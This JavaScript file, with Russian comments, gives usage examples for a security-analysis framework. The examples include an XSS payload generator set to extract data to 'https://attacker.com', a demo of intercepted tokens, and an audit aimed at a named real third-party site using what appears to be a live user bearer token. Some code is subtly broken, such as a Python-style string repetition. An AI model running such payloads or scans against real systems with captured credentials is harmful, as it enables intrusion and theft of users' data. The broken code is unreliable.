/**
 * ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ ИНСТРУМЕНТОВ АНАЛИЗА БЕЗОПАСНОСТИ
 * 
 * Этот файл содержит примеры использования всех компонентов
 * фреймворка анализа безопасности.
 */

// ============================================================================
// ПРИМЕР 1: БАЗОВЫЙ АНАЛИЗ УТЕЧЕК ДАННЫХ
// ============================================================================

async function exampleDataLeakAnalysis() {
    console.log("🔍 ПРИМЕР 1: Анализ утечек данных");
    
    // Инициализация фреймворка
    const framework = new SecurityAnalysisFramework();
    framework.init('https://example.com');
    
    // Запуск анализа
    const leaks = await framework.analyzeDataLeaks();
    
    console.log("Результаты анализа:", leaks);
    return leaks;
}

// ============================================================================
// ПРИМЕР 2: АНАЛИЗ API КОНТРАКТА
// ============================================================================

async function exampleAPIAnalysis() {
    console.log("🔌 ПРИМЕР 2: Анализ API контракта");
    
    // Пример JavaScript кода для анализа
    const jsContent = `
        fetch('/api/users/123', {
            method: 'GET',
            headers: { 'Authorization': 'Bearer token123' }
        });
        
        axios.post('/api/application/submit', {
            userId: 456,
            data: { name: 'John', email: 'john@example.com' }
        });
    `;
    
    // Инициализация анализатора
    const analyzer = new APIContractAnalyzer();
    analyzer.init('https://api.example.com', 'bearer-token');
    
    // Запуск анализа
    const report = await analyzer.runFullAPIAnalysis(jsContent);
    
    console.log("Отчет по API:", report);
    return report;
}

// ============================================================================
// ПРИМЕР 3: ГЕНЕРАЦИЯ XSS PAYLOAD
// ============================================================================

function exampleXSSPayloads() {
    console.log("🎯 ПРИМЕР 3: Генерация XSS payload");
    
    // Инициализация генератора
    const generator = new XSSPayloadGenerator();
    
    // Получение всех payload
    const allPayloads = generator.getAllPayloads();
    console.log("Все доступные payload:", allPayloads);
    
    // Создание кастомного payload
    const customPayload = generator.createCustomPayload({
        action: 'notification',
        message: 'Демонстрация XSS',
        dataExtraction: true,
        targetUrl: 'https://attacker.com'
    });
    
    console.log("Кастомный payload:", customPayload);
    return { allPayloads, customPayload };
}

// ============================================================================
// ПРИМЕР 4: КОМПЛЕКСНЫЙ АУДИТ
// ============================================================================

async function exampleComprehensiveAudit() {
    console.log("🚀 ПРИМЕР 4: Комплексный аудит безопасности");
    
    // Пример данных для анализа
    const targetUrl = 'https://example.com';
    const authToken = 'user.2045597475330327839.60526-0d7eb462c42a221300af346a7a.1efa83c73e0ac992c0cf22b196cf6541bd268d402051e1e2';
    const jsContent = `
        // API эндпоинты
        fetch('/api/application/retrieve/60526');
        fetch('/api/application/files/60526');
        fetch('/api/application/urls/60526');
        
        // Чувствительные данные
        const apiKey = "SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED";
        const userToken = "user.2045597475330327839.60526-0d7eb462c42a221300af346a7a.1efa83c73e0ac992c0cf22b196cf6541bd268d402051e1e2";
    `;
    
    // Инициализация аудитора
    const auditor = new ComprehensiveSecurityAudit();
    auditor.init(targetUrl, authToken, jsContent);
    
    // Запуск полного аудита
    const report = await auditor.runFullAudit();
    
    // Сохранение отчета
    auditor.saveReport(report, 'example_audit_report.json');
    
    console.log("Отчет по аудиту:", report);
    return report;
}

// ============================================================================
// ПРИМЕР 5: ДЕМОНСТРАЦИЯ УЯЗВИМОСТЕЙ
// ============================================================================

function exampleVulnerabilityDemonstration() {
    console.log("🎭 ПРИМЕР 5: Демонстрация уязвимостей");
    
    // Демонстрация утечки данных
    const mockDataLeak = {
        localStorage: {
            'auth_token': 'user.2045597475330327839.60526-0d7eb462c42a221300af346a7a.1efa83c73e0ac992c0cf22b196cf6541bd268d402051e1e2',
            'user_id': '2045597475330327839',
            'app_id': '60526'
        },
        sessionStorage: {
            'session_data': 'sensitive_session_information'
        },
        cookies: {
            'session_id': 'abc123def456',
            'user_preferences': 'theme=dark&lang=ru'
        }
    };
    
    console.log("Демонстрация утечки данных:", mockDataLeak);
    
    // Демонстрация перехвата токенов
    const tokenInterception = {
        intercepted_tokens: [
            {
                type: 'Bearer Token',
                value: 'user.2045597475330327839.60526-0d7eb462c42a221300af346a7a.1efa83c73e0ac992c0cf22b196cf6541bd268d402051e1e2',
                source: 'localStorage',
                timestamp: new Date().toISOString()
            },
            {
                type: 'API Key',
                value: 'SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED',
                source: 'JavaScript code',
                timestamp: new Date().toISOString()
            }
        ]
    };
    
    console.log("Демонстрация перехвата токенов:", tokenInterception);
    
    return { mockDataLeak, tokenInterception };
}

// ============================================================================
// ПРИМЕР 6: АНАЛИЗ КОНКРЕТНОЙ СИСТЕМЫ
// ============================================================================

async function exampleSpecificSystemAnalysis() {
    console.log("🎯 ПРИМЕР 6: Анализ конкретной системы");
    
    // Анализ системы applications.iidf.ru
    const targetSystem = {
        url: 'https://applications.iidf.ru',
        authToken: 'user.2045597475330327839.60526-0d7eb462c42a221300af346a7a.1efa83c73e0ac992c0cf22b196cf6541bd268d402051e1e2',
        knownVulnerabilities: [
            'Утечка персональных данных пользователя',
            'Утечка исходного кода',
            'Утечка FontAwesome Pro лицензии',
            'Отсутствие backend валидации'
        ]
    };
    
    console.log("Анализируемая система:", targetSystem);
    
    // Создание аудитора для конкретной системы
    const auditor = new ComprehensiveSecurityAudit();
    auditor.init(targetSystem.url, targetSystem.authToken);
    
    // Анализ утечек данных
    const dataLeaks = await auditor.analyzeDataLeaks();
    
    // Сканирование уязвимостей
    const vulnerabilities = await auditor.scanVulnerabilities();
    
    // Генерация рекомендаций
    const recommendations = auditor.generateRecommendations();
    
    const analysisReport = {
        targetSystem,
        dataLeaks,
        vulnerabilities,
        recommendations,
        timestamp: new Date().toISOString()
    };
    
    console.log("Отчет по анализу системы:", analysisReport);
    return analysisReport;
}

// ============================================================================
// ЗАПУСК ВСЕХ ПРИМЕРОВ
// ============================================================================

async function runAllExamples() {
    console.log("🚀 ЗАПУСК ВСЕХ ПРИМЕРОВ");
    console.log("=" * 60);
    
    try {
        // Пример 1: Анализ утечек данных
        await exampleDataLeakAnalysis();
        console.log("\n" + "=" * 40 + "\n");
        
        // Пример 2: Анализ API
        await exampleAPIAnalysis();
        console.log("\n" + "=" * 40 + "\n");
        
        // Пример 3: XSS payload
        exampleXSSPayloads();
        console.log("\n" + "=" * 40 + "\n");
        
        // Пример 4: Комплексный аудит
        await exampleComprehensiveAudit();
        console.log("\n" + "=" * 40 + "\n");
        
        // Пример 5: Демонстрация уязвимостей
        exampleVulnerabilityDemonstration();
        console.log("\n" + "=" * 40 + "\n");
        
        // Пример 6: Анализ конкретной системы
        await exampleSpecificSystemAnalysis();
        
        console.log("\n✅ ВСЕ ПРИМЕРЫ ЗАВЕРШЕНЫ");
        
    } catch (error) {
        console.error("❌ ОШИБКА ПРИ ВЫПОЛНЕНИИ ПРИМЕРОВ:", error);
    }
}

// ============================================================================
// ЭКСПОРТ ФУНКЦИЙ
// ============================================================================

if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        exampleDataLeakAnalysis,
        exampleAPIAnalysis,
        exampleXSSPayloads,
        exampleComprehensiveAudit,
        exampleVulnerabilityDemonstration,
        exampleSpecificSystemAnalysis,
        runAllExamples
    };
} else if (typeof window !== 'undefined') {
    window.SecurityExamples = {
        exampleDataLeakAnalysis,
        exampleAPIAnalysis,
        exampleXSSPayloads,
        exampleComprehensiveAudit,
        exampleVulnerabilityDemonstration,
        exampleSpecificSystemAnalysis,
        runAllExamples
    };
}

// Автоматический запуск при загрузке в браузере
if (typeof window !== 'undefined') {
    console.log("📚 ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ ЗАГРУЖЕНЫ");
    console.log("Используйте: SecurityExamples.runAllExamples()");
    
    // Автоматический запуск при добавлении параметра ?examples=true
    if (window.location.search.includes('examples=true')) {
        console.log("🔍 АВТОМАТИЧЕСКИЙ ЗАПУСК ПРИМЕРОВ");
        setTimeout(() => {
            runAllExamples();
        }, 1000);
    }
}

